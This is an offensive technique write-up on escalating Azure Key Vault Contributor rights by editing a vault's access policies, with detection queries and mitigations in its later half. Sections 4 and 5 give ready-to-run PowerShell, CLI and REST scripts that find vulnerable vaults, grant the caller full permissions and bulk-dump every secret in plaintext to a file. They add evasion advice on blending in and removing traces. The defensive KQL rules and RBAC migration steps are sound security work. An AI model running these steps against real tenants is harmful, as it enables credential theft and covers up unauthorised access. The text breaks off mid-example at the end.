# [CA-UNSC-011]: Key Vault access policies abuse

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-011 |
| **MITRE ATT&CK v18.1** | [T1552.007 - Unsecured Credentials: Container API](https://attack.mitre.org/techniques/T1552/007/) (mapped as cloud secrets management access via misconfigured policies) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID (Azure Cloud) |
| **Severity** | Critical |
| **CVE** | N/A (Note: CVE-2023-28432 is MinIO, not Azure KV. This technique exploits management plane permission escalation to data plane, disclosed by Datadog Dec 2024, confirmed by Microsoft MSRC as "design behavior") |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-06 |
| **Affected Versions** | All Azure Key Vault deployments using **legacy Access Policies model** (cloud-agnostic), PowerShell 5.0+, Azure CLI 2.0+ |
| **Patched In** | N/A - Microsoft confirmed (Nov 11, 2024) this is "design behavior" not a vulnerability. Mitigation: Migrate to Azure RBAC permissions model (eliminates this escalation path entirely) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

**Note:** Sections 6 (Atomic Red Team), 10 (Sysmon Detection), and 12 (Microsoft Defender for Cloud specific alerts) not included because: (1) No specific Atomic test exists for Key Vault access policy escalation, (2) Sysmon does not monitor cloud activity, (3) MDC alerts are covered in detection section via Sentinel and Azure Monitor. All section numbers have been dynamically renumbered based on applicability.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Key Vault supports two permission models for controlling access to data (keys, secrets, certificates): **Access Policies** (legacy, vault-scoped) and **Azure RBAC** (modern, integrated with subscription/resource group RBAC). Access Policies are a separate authorization system that coexists with Azure RBAC for management plane operations. The vulnerability stems from a permission model mismatch: Users with the **Key Vault Contributor** RBAC role (intended for vault management only, no data access) can escalate their privileges to extract vault data by directly modifying the vault's Access Policies. Specifically, the `Microsoft.KeyVault/vaults/write` permission (held by Key Vault Contributor and other roles like Contributor and Owner) allows modification of Access Policies. An attacker with this permission can add themselves to the vault's Access Policies with full permissions (Get, List, Create, Delete, Decrypt, Sign, etc.), effectively bypassing RBAC restrictions intended to prevent data access. This escalation is **only possible on vaults using the Access Policy model**; vaults configured with Azure RBAC are immune.

**Attack Surface:** Azure Key Vault management plane (modification of `accessPolicies` property), specifically targeted at vaults using the legacy Access Policy permission model. The attack targets the `/vaults/{vault-name}/accessPolicies` endpoint or PowerShell cmdlets like `Set-AzKeyVaultAccessPolicy`.

**Business Impact:** **Complete vault compromise and credential exfiltration.** An attacker with Key Vault Contributor role on a resource group containing multiple key vaults can extract all secrets, keys, and certificates from vaults using Access Policies. This is particularly dangerous because organizations often assume the Key Vault Contributor role does NOT grant data access (per Microsoft's original documentation). Many organizations assign this role broadly to teams managing Azure infrastructure, unaware it enables full vault compromise on legacy deployments. The attack is stealthy: a single access policy modification followed by secret extraction may not trigger alerts if audit logging is disabled or not monitored.

**Technical Context:** Exploitation is immediate (seconds) once permissions are obtained. Detection likelihood is **Medium-to-High** if audit logging monitors access policy changes. The attack is **reversible** only if discovered before secrets are exfiltrated; detection after data access requires credential rotation.

### Operational Risk

- **Execution Risk:** Low - Simple API call or PowerShell command. No complex exploitation required. Can be performed by any account with Key Vault Contributor role (often assigned to infrastructure teams).
- **Stealth:** Medium - Access policy modification is logged in audit logs (if enabled), but many organizations do not actively monitor these changes. Bulk secret retrieval after policy modification is more suspicious.
- **Reversibility:** Partial - Access policy can be removed, but if attacker used the time window to exfiltrate secrets, damage is irreversible.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1 | Ensure that Azure Key Vault is encrypted - includes RBAC recommendation |
| **CIS Benchmark** | 2.2 | Ensure that Key Vault uses Azure RBAC authorization, not Access Policies |
| **DISA STIG** | SI-7 | Information System Monitoring - audit all access policy changes |
| **NIST 800-53** | AC-2 | Account Management - control who can modify access policies |
| **NIST 800-53** | AC-3 | Access Enforcement - prevent unauthorized policy modifications |
| **NIST 800-53** | AC-6 | Least Privilege - Key Vault Contributor should not grant data access |
| **GDPR** | Art. 32 | Security of Processing - protect cryptographic keys and secrets |
| **DORA** | Art. 9 | Protection and Prevention - safeguard authorization credentials |
| **NIS2** | Art. 21 | Cyber Risk Management - access control and secrets management |
| **ISO 27001** | A.9.2 | User Access Management - control access policy modifications |
| **ISO 27001** | A.6.2 | Asset Management - protect cryptographic key assets |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- Minimum: **Key Vault Contributor** RBAC role on the target Key Vault, resource group, or subscription
- Or: **Contributor** or **Owner** role on the Key Vault (both include `Microsoft.KeyVault/vaults/write` permission)
- Or: Custom RBAC role with `Microsoft.KeyVault/vaults/write` permission

**Important Condition:** The target Key Vault MUST use **Access Policies** for authorization, NOT Azure RBAC. (If vault uses RBAC, this escalation is impossible.)

**Required Access:**
- Network access to Azure Portal, PowerShell, Azure CLI, or REST API
- Valid authentication token as a user/service principal with the above roles
- Permission to read and write vault properties (specifically `accessPolicies`)

**Supported Versions:**
- **Azure Key Vault:** All versions (cloud-native)
- **PowerShell modules:** Az.KeyVault v4.0+ (tested up to 5.3.0), Set-AzKeyVaultAccessPolicy cmdlet
- **Azure CLI:** 2.0+ (tested up to 2.60+), `az keyvault set-policy` command
- **REST API:** Azure Key Vault API v7.0+
- **Affected Platforms:** Windows Server 2016+, Linux, macOS

**Tools:**
- [Azure PowerShell (Az.KeyVault)](https://learn.microsoft.com/en-us/powershell/module/az.keyvault/) (v4.0+)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (v2.0+)
- [Azure REST API](https://learn.microsoft.com/en-us/rest/api/keyvault/)
- [curl](https://curl.se/) or [Postman](https://www.postman.com/) for REST calls

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Command 1: Check your current RBAC role on subscriptions and resource groups**

```powershell
# Get current user context
$context = Get-AzContext
Write-Host "Current Account: $($context.Account.Id)"
Write-Host "Subscription: $($context.Subscription.Name)"

# List all role assignments for the user
$roleAssignments = Get-AzRoleAssignment -SignInName $context.Account.Id

Write-Host "`n[*] RBAC Roles assigned to current user:"
foreach ($role in $roleAssignments) {
    Write-Host "  Role: $($role.RoleDefinitionName) | Scope: $($role.Scope) | ResourceName: $($role.ResourceName)"
    
    # Highlight dangerous roles
    if ($role.RoleDefinitionName -in @("Key Vault Contributor", "Contributor", "Owner")) {
        Write-Host "    [!] WARNING: This role can escalate to Key Vault data access via Access Policies!"
    }
}
```

**What to Look For:**
- If you have `Key Vault Contributor`, `Contributor`, or `Owner` role, you can exploit vaults using Access Policies
- Scope matters: subscription-level or resource-group-level assignments can target multiple vaults
- If you see "Key Vault Administrator" (RBAC role), you already have full data access (no escalation needed)

**Command 2: Enumerate Key Vaults and identify their permission model**

```powershell
# Get all Key Vaults
$keyVaults = Get-AzKeyVault

Write-Host "[*] Auditing Key Vaults for permission model..."
$accessPolicyVaults = @()
$rbacVaults = @()

foreach ($vault in $keyVaults) {
    Write-Host "`nVault: $($vault.VaultName)"
    Write-Host "  Resource Group: $($vault.ResourceGroupName)"
    Write-Host "  Location: $($vault.Location)"
    
    # Check if RBAC is enabled
    $vaultDetails = Get-AzKeyVault -VaultName $vault.VaultName -ResourceGroupName $vault.ResourceGroupName
    
    if ($vaultDetails.EnableRbacAuthorization -eq $true) {
        Write-Host "  Permission Model: [✓] Azure RBAC (SECURE - not vulnerable to this escalation)"
        $rbacVaults += $vault.VaultName
    } else {
        Write-Host "  Permission Model: [!] ACCESS POLICIES (VULNERABLE - Can be exploited)"
        $accessPolicyVaults += $vault.VaultName
        
        # Show current access policies
        Write-Host "    Current Access Policies:"
        foreach ($policy in $vaultDetails.AccessPolicies) {
            Write-Host "      - ObjectId: $($policy.ObjectId)"
            Write-Host "        Permissions: Keys [$($policy.PermissionsToKeys -join ', ')], Secrets [$($policy.PermissionsToSecrets -join ', ')], Certs [$($policy.PermissionsToCertificates -join ', ')]"
        }
    }
}

Write-Host "`n[SUMMARY]"
Write-Host "Vaults using RBAC (Secure): $($rbacVaults.Count)"
Write-Host "Vaults using Access Policies (Vulnerable): $($accessPolicyVaults.Count)"

if ($accessPolicyVaults.Count -gt 0) {
    Write-Host "`n[!] VULNERABLE VAULTS IDENTIFIED:"
    $accessPolicyVaults | ForEach-Object { Write-Host "    - $_" }
}
```

**What to Look For:**
- Vaults with `EnableRbacAuthorization = $false` are using Access Policies (VULNERABLE)
- List of current access policy principals (these can be modified if you have Contributor role)
- High-privilege secrets/keys stored in vulnerable vaults

**Command 3: Test if you can modify access policies (preliminary exploitation test)**

```powershell
$vaultName = "vulnerable-vault-name"  # Change to target vault using Access Policies
$resourceGroupName = "target-rg"

try {
    # Try to read current access policies (if this works, you likely can modify them)
    $vault = Get-AzKeyVault -VaultName $vaultName -ResourceGroupName $resourceGroupName
    
    if ($vault.EnableRbacAuthorization -eq $false) {
        Write-Host "[✓] Vault uses Access Policies (vulnerable model)"
        
        # Try to add yourself to access policies (test modification)
        $currentUser = (Get-AzContext).Account.ObjectId
        
        # Note: Don't actually add yourself yet; just test if the command would work
        Write-Host "[*] Attempting to modify access policies..."
        
        # This would actually add the policy - for reconnaissance, we'll just show the command
        Write-Host "    Command to escalate: Set-AzKeyVaultAccessPolicy -VaultName '$vaultName' -ResourceGroupName '$resourceGroupName' -ObjectId '$currentUser' -PermissionsToSecrets Get,List,Set,Delete,Recover,Backup,Restore -PermissionsToKeys Get,List,Decrypt,Encrypt,Sign,Verify"
        
        Write-Host "[!] If you have Key Vault Contributor role, the above command WILL WORK and grant you full access"
    } else {
        Write-Host "[✓] Vault uses RBAC (NOT vulnerable to this escalation)"
    }
    
} catch {
    Write-Host "[✗] Access denied or vault not found: $($_.Exception.Message)"
}
```

**What This Means:**
- If no error is thrown, you can likely modify access policies
- If you get "Insufficient privileges", you may not have the right role
- If vault uses RBAC, this escalation won't work

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Direct Access Policy Modification Using PowerShell

**Supported Versions:** All Azure Key Vault versions, PowerShell 5.0+

#### Step 1: Authenticate and connect to Azure

```powershell
# Connect using user credentials
Connect-AzAccount -Tenant "tenant-id" -Subscription "subscription-id"

# Verify connection
$context = Get-AzContext
Write-Host "Connected as: $($context.Account.Id)"
Write-Host "Subscription: $($context.Subscription.Name)"
```

---

#### Step 2: Identify target Key Vault using Access Policies

```powershell
# Find a vault using Access Policies (vulnerable)
$vaultName = "target-vault-name"
$resourceGroupName = "target-resource-group"

$targetVault = Get-AzKeyVault -VaultName $vaultName -ResourceGroupName $resourceGroupName

if (-not $targetVault) {
    Write-Host "[✗] Vault not found"
    exit
}

Write-Host "[✓] Found vault: $($targetVault.VaultName)"
Write-Host "    Permission Model: $(if ($targetVault.EnableRbacAuthorization) { 'RBAC (not vulnerable)' } else { 'Access Policies (vulnerable)' })"

if ($targetVault.EnableRbacAuthorization -eq $true) {
    Write-Host "[✗] This vault uses RBAC, not Access Policies - escalation not possible"
    exit
}

Write-Host "[✓] Vault is vulnerable (using Access Policies)"
```

---

#### Step 3: Add yourself to the vault's access policies with full permissions

**Objective:** Grant yourself (or a compromised principal) full access to all secrets, keys, and certificates.

```powershell
# Get current user's object ID
$currentUserObjectId = (Get-AzContext).Account.ObjectId
Write-Host "[*] Your ObjectId: $currentUserObjectId"

# Add yourself to the vault's access policies with full permissions
Write-Host "[*] Adding yourself to vault access policies..."

Set-AzKeyVaultAccessPolicy -VaultName $vaultName `
    -ResourceGroupName $resourceGroupName `
    -ObjectId $currentUserObjectId `
    -PermissionsToKeys Get, List, Update, Create, Import, Delete, Decrypt, Sign, Verify, UnwrapKey, WrapKey, Recover, Restore, Purge `
    -PermissionsToSecrets Get, List, Set, Delete, Recover, Backup, Restore `
    -PermissionsToCertificates Get, List, Delete, Create, Import, Update, ManageContacts, ManageIssuers, GetIssuers, ListIssuers, SetIssuers, DeleteIssuers, Recover, Restore, Purge `
    -PassThru

Write-Host "[✓] Access policy modification complete!"
```

**Expected Output:**

```
[*] Your ObjectId: 12345678-1234-1234-1234-123456789012
[*] Adding yourself to vault access policies...

VaultName                    : vulnerable-vault-name
ResourceGroupName            : target-resource-group
Location                     : eastus
ResourceId                   : /subscriptions/{sub}/resourceGroups/target-resource-group/providers/Microsoft.KeyVault/vaults/vulnerable-vault-name
Tags                         : {}
TenantId                     : abcdefgh-1234-5678-9012-abcdefghijkl
SKU                          : Standard
AccessPolicies               : {...}
EnableRbacAuthorization      : False
EnablePurgeProtection        : True
EnableSoftDelete             : True
[✓] Access policy modification complete!
```

**What This Means:**
- Access policy successfully modified
- Your principal now has Get, List, and other permissions on all data
- You can now extract secrets, keys, and certificates from the vault

**OpSec & Evasion:**
- This command logs to audit logs: Operation = "Update vault"
- Use a service principal instead of user account to blend in with automation
- Immediately extract data after this change (time window of opportunity)
- Consider removing yourself from access policies after extraction to reduce forensic evidence
- Set a generic display name if possible (though Object IDs are more indicative than display names)

**Troubleshooting:**

- **Error:** "The user, group, or application 'xxx' does not exist in the directory"
  - **Cause:** Invalid ObjectId
  - **Fix:** Verify ObjectId with `(Get-AzContext).Account.ObjectId`

- **Error:** "Insufficient privileges to complete the operation"
  - **Cause:** You don't have Key Vault Contributor role on this vault/RG
  - **Fix:** Check your RBAC roles with `Get-AzRoleAssignment`

- **Error:** "The operation is not allowed by RBAC"
  - **Cause:** Vault is using Azure RBAC, not Access Policies
  - **Fix:** Check with `Get-AzKeyVault ... | Select EnableRbacAuthorization`

---

#### Step 4: Extract secrets from the vault

**Objective:** Now that you have access policy permissions, retrieve sensitive data.

```powershell
# List all secrets in the vault
Write-Host "[*] Listing secrets in vault..."
$secrets = Get-AzKeyVaultSecret -VaultName $vaultName

Write-Host "[✓] Found $($secrets.Count) secrets:"
foreach ($secret in $secrets) {
    Write-Host "  - $($secret.Name)"
}

# Extract a specific secret
$secretName = "api-key"  # Change to target secret
Write-Host "`n[*] Extracting secret: $secretName"

try {
    $secretValue = Get-AzKeyVaultSecret -VaultName $vaultName -Name $secretName
    Write-Host "[✓] Secret extracted:"
    Write-Host "    Value: $($secretValue.SecretValue | ConvertFrom-SecureString -AsPlainText)"
} catch {
    Write-Host "[✗] Failed to extract secret: $($_.Exception.Message)"
}

# Bulk extraction of all secrets
Write-Host "`n[*] Performing bulk extraction..."
$extractedSecrets = @()

foreach ($secret in $secrets) {
    try {
        $secretValue = Get-AzKeyVaultSecret -VaultName $vaultName -Name $secret.Name
        $plainText = $secretValue.SecretValue | ConvertFrom-SecureString -AsPlainText
        
        $extractedSecrets += @{
            SecretName = $secret.Name
            SecretValue = $plainText
            Created = $secret.Created
            Expires = $secret.Expires
        }
        
        Write-Host "  [✓] $($secret.Name)"
    } catch {
        Write-Host "  [✗] $($secret.Name): Access denied"
    }
}

# Export to file
$extractedSecrets | ConvertTo-Json | Out-File "$env:TEMP\vault_secrets.json"
Write-Host "[✓] Extracted $($extractedSecrets.Count) secrets"
Write-Host "[✓] Secrets saved to: $env:TEMP\vault_secrets.json"
```

---

### METHOD 2: Using Azure CLI

```bash
#!/bin/bash

VAULT_NAME="vulnerable-vault-name"
RESOURCE_GROUP="target-resource-group"
CURRENT_USER_ID=$(az account show --query id -o tsv)

# Add yourself to access policies
echo "[*] Adding your principal to vault access policies..."

az keyvault set-policy \
  --name $VAULT_NAME \
  --resource-group $RESOURCE_GROUP \
  --object-id $CURRENT_USER_ID \
  --secret-permissions get list set delete recover backup restore \
  --key-permissions get list update create import delete decrypt sign verify unwrapKey wrapKey recover restore purge \
  --certificate-permissions get list delete create import update

echo "[✓] Access policy modified"

# List and extract all secrets
echo "[*] Extracting secrets from vault..."

SECRETS=$(az keyvault secret list --vault-name $VAULT_NAME --query "[].name" -o tsv)

for SECRET in $SECRETS; do
    echo "  [*] Extracting: $SECRET"
    SECRET_VALUE=$(az keyvault secret show --vault-name $VAULT_NAME --name $SECRET --query "value" -o tsv)
    echo "      Value: $SECRET_VALUE"
done
```

---

### METHOD 3: REST API Direct Approach

```bash
#!/bin/bash

VAULT_NAME="vulnerable-vault-name"
TENANT_ID="your-tenant-id"
CURRENT_USER_ID="your-object-id"
SUBSCRIPTION_ID="your-subscription-id"
RESOURCE_GROUP="target-resource-group"

# Get access token
ACCESS_TOKEN=$(curl -s -X POST \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
  -d "client_id=YOUR_CLIENT_ID&client_secret=YOUR_CLIENT_SECRET&scope=https://management.azure.com/.default&grant_type=client_credentials" \
  | jq -r '.access_token')

# Get current access policies
echo "[*] Fetching current access policies..."
CURRENT_POLICIES=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.KeyVault/vaults/${VAULT_NAME}?api-version=2024-04-01" \
  | jq '.properties.accessPolicies')

# Create new policy entry for yourself
NEW_POLICY=$(cat <<EOF
{
  "tenantId": "${TENANT_ID}",
  "objectId": "${CURRENT_USER_ID}",
  "permissions": {
    "keys": ["get", "list", "update", "create", "import", "delete", "decrypt", "sign", "verify", "unwrapKey", "wrapKey", "recover", "restore", "purge"],
    "secrets": ["get", "list", "set", "delete", "recover", "backup", "restore"],
    "certificates": ["get", "list", "delete", "create", "import", "update"]
  }
}
EOF
)

# Add new policy to existing policies
UPDATED_POLICIES=$(echo "$CURRENT_POLICIES" | jq ". += [$NEW_POLICY]")

# Update the Key Vault with new access policies
echo "[*] Updating access policies..."
curl -s -X PUT -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.KeyVault/vaults/${VAULT_NAME}?api-version=2024-04-01" \
  -d "{\"properties\": {\"accessPolicies\": $UPDATED_POLICIES}}" \
  | jq '.properties.accessPolicies'

echo "[✓] Access policy updated"

# Extract secrets via REST API (Vault API v7.4)
echo "[*] Extracting secrets..."
curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
  "https://${VAULT_NAME}.vault.azure.net/secrets?api-version=7.4" \
  | jq '.value[] | .id'
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network IOCs:**
- Destination: `https://management.azure.com/`, `https://{vault-name}.vault.azure.net/`
- HTTP Method: PUT (for modifying access policies), GET (for extracting secrets)
- URI patterns: `/accessPolicies`, `/secrets`, `/keys`, `/certificates`
- User-Agent: `Azure-CLI`, `Azure-PowerShell`, `curl`, custom tools

**Audit Log IOCs:**
- **Operation:** "Update vault", "Set access policy", "Patch vault"
- **Result Type:** Success (HTTP 200, 201)
- **Resource:** Key Vault name
- **Initiator:** User/service principal with Key Vault Contributor role
- **Modified Properties:** `accessPolicies` field modified to add new principal with Get/List/Decrypt permissions
- **Abnormal patterns:**
  - User with Contributor role modifying access policies (unusual)
  - New principal added to access policies immediately followed by secret retrieval
  - Access policy grant with full permissions to previously unknown principal
  - Modification during off-hours or outside change window

**Forensic Artifacts:**

**Azure Audit Logs (AuditLogs table):**
- OperationName = "Update vault"
- InitiatedBy = user with Key Vault Contributor role
- TargetResources[0].resourceDisplayName = vault name
- TargetResources[0].modifiedProperties = contains "accessPolicies"

**Key Vault Diagnostic Logs (AzureDiagnostics table):**
- Category = "AuditEvent"
- OperationName = "SecretGet", "KeyGet" (after policy modification)
- CallerIPAddress = source of secret extraction

**Sign-in Logs (SigninLogs table):**
- Service principal sign-in from unusual location after policy modification

---

### Microsoft Sentinel Detection Queries

#### Rule 1: Detect access policy modification by non-admin user

**KQL Query:**

```kusto
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName == "Update vault" or OperationName == "Set access policy"
| where Result == "Success"
| extend VaultName = TargetResources[0].displayName
| extend InitiatedByUser = InitiatedBy.user.userPrincipalName
| extend ModifiedProperties = TargetResources[0].modifiedProperties
// Filter for access policy modifications
| where ModifiedProperties contains "accessPolicies"
// Identify if initiator is a Contributor-level user (not admin)
| join kind=leftanti (
    AuditLogs
    | where OperationName == "Add member to role"
    | where TargetResources[0].displayName in ("Global Administrator", "Key Vault Data Access Administrator")
    | extend AdminUser = InitiatedBy.user.userPrincipalName
    | project AdminUser
) on $left.InitiatedByUser == $right.AdminUser
// Alert if Contributor user modified access policies
| project TimeGenerated, InitiatedByUser, VaultName, OperationName, Result
```

**What This Detects:**
- User with Contributor role modifying Key Vault access policies
- Non-administrators shouldn't be modifying access policies
- Filters out legitimate admin operations

---

#### Rule 2: Detect access policy modification followed by bulk secret retrieval

**KQL Query:**

```kusto
// Step 1: Find access policy modifications
AuditLogs
| where TimeGenerated > ago(24h)
| where OperationName in ("Update vault", "Set access policy")
| where Result == "Success"
| extend VaultName = TargetResources[0].displayName
| extend PolicyModifier = InitiatedBy.user.userPrincipalName
// Step 2: Correlate with secret retrieval within 10 minutes
| join kind=inner (
    AzureDiagnostics
    | where TimeGenerated > ago(24h)
    | where OperationName in ("SecretGet", "SecretList", "KeyGet", "KeyList")
    | where resultSignature_s == "OK"  // Success
    | extend VaultName = ResourceDisplayName
    | summarize SecretAccessCount = count() by VaultName, CallerIPAddress, bin(TimeGenerated, 10m)
    | where SecretAccessCount > 5  // More than 5 secret accesses in 10 mins = suspicious
) on VaultName
| project TimeGenerated, PolicyModifier, VaultName, SecretAccessCount, CallerIPAddress
```

---

#### Rule 3: Detect Key Vault Contributor granting themselves secret access

**KQL Query:**

```kusto
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName in ("Update vault", "Set access policy")
| where Result == "Success"
| extend VaultName = TargetResources[0].displayName
| extend Initiator = InitiatedBy.user.userPrincipalName
| extend InitiatorObjectId = InitiatedBy.user.id
| extend ModifiedProperties = TargetResources[0].modifiedProperties
// Check if the policy grants access to the same user who initiated the change
| where ModifiedProperties contains InitiatorObjectId  // User adding themselves
| where ModifiedProperties contains ("Get") and ModifiedProperties contains ("List")  // Granting secret access
| project TimeGenerated, Initiator, VaultName, ModifiedProperties
```

---

### Azure Monitor / Log Analytics Hunting

```kusto
// Hunt for all access policy changes in past 30 days
AuditLogs
| where TimeGenerated > ago(30d)
| where OperationName in ("Update vault", "Set access policy", "Update access policy")
| where Result == "Success"
| extend VaultName = TargetResources[0].displayName
| extend Initiator = InitiatedBy.user.userPrincipalName
| extend Properties = TargetResources[0].modifiedProperties
| where Properties contains "accessPolicies"
| summarize
    ModificationCount = count(),
    VaultNames = make_set(VaultName),
    LastModification = max(TimeGenerated)
    by Initiator
| where ModificationCount > 2  // Users modifying multiple vaults
| order by ModificationCount desc
```

---

## 7. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

**1. Migrate ALL Key Vaults from Access Policies to Azure RBAC model**

**Manual Steps (Azure Portal):**
1. Go to **Key Vault** → **Properties**
2. Under **Permission Model**, click **Change to Azure RBAC**
3. Confirm the change (this will invalidate existing Access Policies)
4. Navigate to **Access Control (IAM)**
5. Assign appropriate RBAC roles:
   - **Key Vault Administrator** for managers
   - **Key Vault Secrets User** for applications reading secrets
   - **Key Vault Crypto User** for applications using keys

**Manual Steps (PowerShell - Script to migrate all vaults):**

```powershell
$vaults = Get-AzKeyVault

foreach ($vault in $vaults) {
    if ($vault.EnableRbacAuthorization -eq $false) {
        Write-Host "Migrating: $($vault.VaultName)"
        
        # Enable RBAC on vault
        Update-AzKeyVault -VaultName $vault.VaultName `
            -ResourceGroupName $vault.ResourceGroupName `
            -EnableRbacAuthorizationForDataPlane $true
        
        Write-Host "  [✓] RBAC enabled on $($vault.VaultName)"
        
        # Now manually assign RBAC roles to the principals that previously had access policies
        # (This step requires manual review of existing access policies)
    }
}
```

**Validation Command:**

```powershell
$allVaults = Get-AzKeyVault

$rbacCount = ($allVaults | Where-Object { $_.EnableRbacAuthorization -eq $true } | Measure-Object).Count
$accessPolicyCount = ($allVaults | Where-Object { $_.EnableRbacAuthorization -eq $false } | Measure-Object).Count

Write-Host "[*] Total Vaults: $($allVaults.Count)"
Write-Host "[✓] Using RBAC: $rbacCount"
Write-Host "[!] Still using Access Policies: $accessPolicyCount"

if ($accessPolicyCount -gt 0) {
    Write-Host "`n[!] Vaults still using Access Policies (vulnerable):"
    $allVaults | Where-Object { $_.EnableRbacAuthorization -eq $false } | ForEach-Object { Write-Host "    - $($_.VaultName)" }
}
```

---

**2. Remove Key Vault Contributor role from non-admin users**

**Manual Steps (Azure Portal):**
1. Go to **Subscriptions** or **Resource Groups** where Key Vaults are deployed
2. Click **Access Control (IAM)**
3. Find and select **Key Vault Contributor** role
4. Review all assignees
5. For each non-admin user, click the **...** menu → **Remove**
6. If they need Key Vault access, grant them **Key Vault Administrator** or **Key Vault Secrets User** instead

**Manual Steps (PowerShell):**

```powershell
# Remove Key Vault Contributor from all users in a resource group
$resourceGroup = "target-resource-group"

$roleAssignments = Get-AzRoleAssignment -ResourceGroupName $resourceGroup `
    -RoleDefinitionName "Key Vault Contributor"

foreach ($assignment in $roleAssignments) {
    Write-Host "Removing Key Vault Contributor from: $($assignment.DisplayName)"
    Remove-AzRoleAssignment -ObjectId $assignment.ObjectId `
        -RoleDefinitionName "Key Vault Contributor" `
        -ResourceGroupName $resourceGroup -Force
}
```

---

#### Priority 2: HIGH

**3. Implement Conditional Access policy requiring MFA for vault modifications**

**Manual Steps (Azure Portal):**
1. Go **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. **Name:** `Require MFA for Key Vault Administrative Operations`
3. **Assignments:**
   - **Users:** Select **Directory roles** → Check **Key Vault Data Access Administrator**
   - **Cloud apps:** Select **All cloud apps**
   - **Actions:** Select **User actions** → Check **Manage Azure resources**
4. **Conditions:**
   - **Client apps:** **All clients**
5. **Access controls:**
   - **Grant:** Check **Require multi-factor authentication**
6. **Enable policy:** **On**

---

**4. Audit and remove unused Access Policies**

**Manual Steps:**

```powershell
# List all access policies in all vaults
$vaults = Get-AzKeyVault

foreach ($vault in $vaults) {
    if ($vault.EnableRbacAuthorization -eq $false) {
        Write-Host "Vault: $($vault.VaultName)"
        
        foreach ($policy in $vault.AccessPolicies) {
            # Get the principal name
            $principal = Get-AzADUser -ObjectId $policy.ObjectId -ErrorAction SilentlyContinue
            if (-not $principal) {
                $principal = Get-AzADServicePrincipal -ObjectId $policy.ObjectId -ErrorAction SilentlyContinue
            }
            
            Write-Host "  Principal: $($principal.DisplayName ?? 'Unknown ($($policy.ObjectId))')"
            Write-Host "    Permissions: Keys [$($policy.PermissionsToKeys -join ', ')], Secrets [$($policy.PermissionsToSecrets -join ', ')]"
            
            # Check if principal is still active
            if (-not $principal) {
                Write-Host "    [!] WARNING: Principal not found (may be deleted user) - should be removed"
            }
        }
    }
}
```

---

#### RBAC / Attribute-based access control (ABAC)

**5. Use granular RBAC roles instead of broad Access Policies**

**Recommended role assignments:**

| Use Case | RBAC Role | Permissions |
|---|---|---|
| Application reading secrets | Key Vault Secrets User | Get secrets, cannot modify |
| Application decrypting data | Key Vault Crypto User | Decrypt/verify keys, cannot modify |
| Vault administrator | Key Vault Administrator | Full management (create, delete, modify) |
| Auditor reviewing vaults | Key Vault Reader | Read metadata only |

**Manual Steps (Azure Portal):**
1. Go to **Key Vault** → **Access Control (IAM)**
2. Click **+ Add** → **Add role assignment**
3. Select appropriate role from table above
4. Assign to user/service principal
5. Click **Review + assign**

**Validation Command (Verify Fix):**

```powershell
# Verify all vaults use RBAC
$vaults = Get-AzKeyVault
$fullyMigrated = $true

foreach ($vault in $vaults) {
    if ($vault.EnableRbacAuthorization -eq $false) {
        Write-Host "[✗] Vault $($vault.VaultName) still uses Access Policies"
        $fullyMigrated = $false
    }
}

if ($fullyMigrated) {
    Write-Host "[✓] All Key Vaults successfully migrated to Azure RBAC"
} else {
    Write-Host "[✗] Migration incomplete - some vaults still use Access Policies"
}
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-002] Consent grant OAuth attacks | Attacker obtains user account with Contributor role |
| **2** | **Privilege Escalation** | [PE-VALID-010] Azure Role Assignment Abuse | Attacker identifies Key Vault Contributor role assignment |
| **3** | **Current Step** | **[CA-UNSC-011]** | **Attacker modifies Key Vault access policies to grant data access** |
| **4** | **Credential Access** | [CA-UNSC-009] or [CA-UNSC-010] | **Attacker extracts keys, secrets, or certificates from vault** |
| **5** | **Impact** | Custom script | Attacker uses extracted credentials for lateral movement/persistence |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Datadog Security Labs Disclosure (December 2024)

**Vulnerability Details:**
- Datadog researchers identified the escalation path: Key Vault Contributor → Access Policy modification → Full data access
- Reported to Microsoft Security Response Center (MSRC) on October 25, 2024
- MSRC determined this is "design behavior" not a vulnerability (November 11, 2024)
- Microsoft updated documentation on October 31, 2024 warning about this risk
- **Key Quote from MSRC:** "Key Vault Contributors have the ability to manage the key vault access policies"

**Attack Scenario:**
1. Attacker compromises user with Key Vault Contributor role
2. Identifies Key Vault using legacy Access Policies model
3. Adds themselves to access policies with Get, List, Decrypt permissions
4. Extracts API keys, database credentials, and authentication tokens
5. Uses extracted credentials to compromise target application

**Detection Failure:**
- Many organizations assume Key Vault Contributor role does NOT grant data access (per original Microsoft documentation)
- Access policy modifications not actively monitored
- Secret retrieval after policy change not correlated with policy modification

**Remediation:**
- Migrate to Azure RBAC model immediately
- Microsoft now explicitly recommends RBAC over Access Policies in updated documentation

**Reference:** [Datadog Security Labs - Escalating Privileges to Read Secrets with Azure Key Vault Access Policies](https://securitylabs.datadoghq.com/articles/escalating-privileges-to-read-secrets-with-azure-key-vault-access-policies/)

---

### Example 2: Infrastructure Team Misconfiguration

**Scenario:**
